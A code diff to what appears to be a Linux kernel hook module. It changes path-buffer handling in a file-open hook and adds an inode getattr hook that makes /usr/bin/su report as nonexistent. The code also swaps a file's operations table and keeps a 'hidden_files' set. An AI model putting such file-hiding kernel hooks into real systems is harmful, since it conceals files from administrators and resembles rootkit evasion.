@@ -102,7 +102,7 @@ hook_file_open(struct file *file)
     struct hidden_file *hidden;
     char *buffer, *path;
 
-    buffer = kmalloc(PATH_MAX, GFP_KERNEL);
+    buffer = __getname();
     path = file_path(file, buffer, PATH_MAX);
 
     if (!strcmp("/usr/bin/su", path)) {
@@ -115,6 +115,7 @@ hook_file_open(struct file *file)
         return 0;
     }
 
+    __putname(buffer);
     fops = kmalloc(sizeof(*fops), GFP_KERNEL);
     hidden = kmalloc(sizeof(*hidden), GFP_KERNEL);
 
@@ -126,7 +127,24 @@ hook_file_open(struct file *file)
 
     file->f_op = fops;
     rb_add(&hidden->node, &hidden_files, hidden_cmp);
-    kfree(buffer);
+
+    return 0;
+}
+
+static int
+hook_inode_getattr(const struct path *dpath)
+{
+    char *buffer, *path;
+
+    buffer = __getname();
+    path = d_path(dpath, buffer, PATH_MAX);
+
+    if (!strcmp("/usr/bin/su", path)) {
+        __putname(buffer);
+        return -ENOENT;
+    }
+
+    __putname(buffer);
 
     return 0;
 }
